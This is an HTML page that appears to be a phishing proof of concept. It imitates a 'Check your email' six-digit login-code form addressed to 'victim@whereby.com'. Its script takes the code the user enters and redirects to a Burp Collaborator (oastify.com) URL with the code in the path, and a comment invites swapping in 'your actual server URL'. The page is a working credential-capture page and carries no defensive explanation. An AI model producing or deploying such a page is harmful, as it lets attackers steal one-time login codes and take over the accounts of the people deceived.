<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Code</title>
  <style>
    body {
      margin: 0;
      font-family: system-ui, sans-serif;
      background-color: #f8f8f8;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
      width: 100%;
    }

    h1 {
      font-family: 'Georgia', serif;
      font-size: 28px;
      margin-bottom: 20px;
    }

    p {
      font-size: 15px;
      margin-bottom: 30px;
      color: #333;
    }

    .code-input {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .code-input input {
      width: 48px;
      height: 56px;
      font-size: 28px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    .info {
      font-size: 14px;
      color: #333;
      margin-bottom: 30px;
    }

    .info span {
      font-weight: bold;
    }

    .login-button {
      display: inline-block;
      background-color: #2e00ff;
      color: white;
      padding: 12px 32px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }

    .login-button:hover {
      background-color: #1a00cc;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Check your email</h1>
    <p>We use this easy login code so you don't have to remember or type in yet another long password.</p>

    <form id="loginForm">
      <div class="code-input">
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
      </div>

      <div class="info">
        We've sent a 6 digit login code to <span>victim@whereby.com</span><br/>
        Can't find it? Check your spam folder.
      </div>

      <button type="submit" class="login-button">Log in</button>
    </form>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    form.addEventListener("submit", function(e) {
      e.preventDefault();
      const inputs = form.querySelectorAll("input");
      const code = Array.from(inputs).map(input => input.value).join("");
      if (code.length === 6) {
        // Replace with your actual server URL
        const url = `https://bdsiwv9ff15dmj4ratadbazg47ayyrmg.oastify.com/code=${code}`;
        window.location.href = url; // Triggers a normal GET request
      } else {
        alert("Please enter all 6 digits.");
      }
    });
  </script>
</body>
</html>
